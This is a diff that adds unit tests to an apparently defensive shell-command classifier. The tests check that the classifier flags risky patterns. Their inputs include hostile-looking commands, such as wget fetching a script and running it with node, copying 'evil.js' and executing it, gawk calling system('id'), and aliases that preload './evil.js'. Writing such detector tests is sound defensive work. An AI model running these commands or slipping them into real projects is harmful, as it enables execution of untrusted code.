@@ -521,6 +521,61 @@ describe("shell classes: review of 1a768af", () => {
 });
 const F2: ClassName[] = ["interp-flag"];
 
+describe("shell classes: review of d6a40bd", () => {
+  const is = (want: ClassName[], cmds: string[]) => { for (const c of cmds) expect(classes(c), c).toEqual(want); };
+  test("P1: quotes inside a substitution inside a substitution, and $'..' with an escaped quote, are read as the shell reads them", () => {
+    const L = "node --loader ./l.mjs a.js";
+    is(["interp-flag"], [`x=$(echo "$(printf '"')"); ${L}`, `x=$(echo "$(printf '"')")\n${L}`, `x=$(printf $'\\''); ${L}`, `x=$(printf $'\\'')\n${L}`, `echo "\${x:-"}"}"; ${L}`, `X=$(cat <<< hi); ${L}`, `X=$(echo \${x:- #}); ${L}`, `echo "$(echo "a" "$(echo 'b')")"; ${L}`]);
+  });
+  test("M1: sed -s takes no value", () => {
+    is(["program-file"], ["sed -sf p.sed x"]);
+    is(["writer-exec"], ["sed -si 's/^/x/' a.js && node a.js"]);
+  });
+  test("M2: wget -O in a cluster and -P directory", () => {
+    is(["writer-exec"], ["wget -qOb.js http://x.invalid/p && node b.js", "wget -P lib http://x.invalid/b.js && node lib/b.js", "wget --directory-prefix=lib http://x.invalid/b.js && node lib/b.js"]);
+  });
+  test("M3: cp to . records the name; an empty target does not match absolute paths", () => {
+    is(["writer-exec"], ["cp lib/evil.js . && node evil.js"]);
+    is([], ["cp x . && node /usr/lib/x.js"]);
+  });
+  test("M4: deno global flags before the subcommand", () => {
+    is(["writer-exec"], ["cat t > a.ts && deno -q run a.ts"]);
+    is(["cd-relative"], ["cd sub && deno -q run a.ts"]);
+  });
+  test("M5: gawk --source", () => {
+    is(["program-file"], ["gawk --source='BEGIN{system(\"id\")}'", "gawk --source 'BEGIN{system(\"id\")}'"]);
+    is([], ["gawk --source='{print}' f"]);
+  });
+  test("L6: dotted versions of every interpreter, and php -c with an attached path", () => {
+    is(["interp-flag"], ["lua5.4 -l evil a.lua", "php8.2 -c ./evil.ini a.php", "php -c./evil.ini a.php", "ruby3.2 -r ./e a.rb", "perl5.36 -MEvil a.pl"]);
+  });
+  test("L7: a wrapper run from a relative path is a file of the package", () => {
+    is(["cd-relative"], ["cd sub && ./timeout 5 true"]);
+    is(["writer-exec"], ["cp evil timeout && ./timeout 5 true"]);
+  });
+  test("L9: an alias defined earlier is expanded (dash does)", () => {
+    is(["interp-flag"], ["alias node='node -r ./evil.js'\nnode a.js"]);
+    is([], ["alias ll='ls -l'\nll", "node a.js"]);
+  });
+  test("F10: a case pattern is not a command", () => {
+    is([], ['case "$1" in a) ;; sh) echo;; esac', 'case "$1" in a|sh) echo;; node) echo;; esac']);
+    is(["interp-flag"], ['case "$1" in a) node -r ./p.js a.js;; esac']);
+  });
+  test("F11: sh < /dev/null reads no program", () => {
+    is([], ["sh < /dev/null"]);
+    is(["interp-stdin"], ["sh < x.sh"]);
+  });
+  test("F12: ruby -Ilib is a load path, not an in-place edit", () => {
+    is(["interp-flag"], ["ruby -Ilib -e 1 a.rb && node a.rb"]);
+    is(["writer-exec"], ["ruby -i -e 1 a.rb && ruby a.rb"]);
+  });
+  test("L13: a long arithmetic text is linear", () => {
+    const t = performance.now();
+    flagBody("((" + "a".repeat(19996) + "))");
+    expect(performance.now() - t).toBeLessThan(1000);
+  });
+});
+
 describe("shell classes: bounded work", () => {
   const rep = (s: string, n: number) => s.repeat(n);
   const inputs: [string, string, ClassName[]][] = [
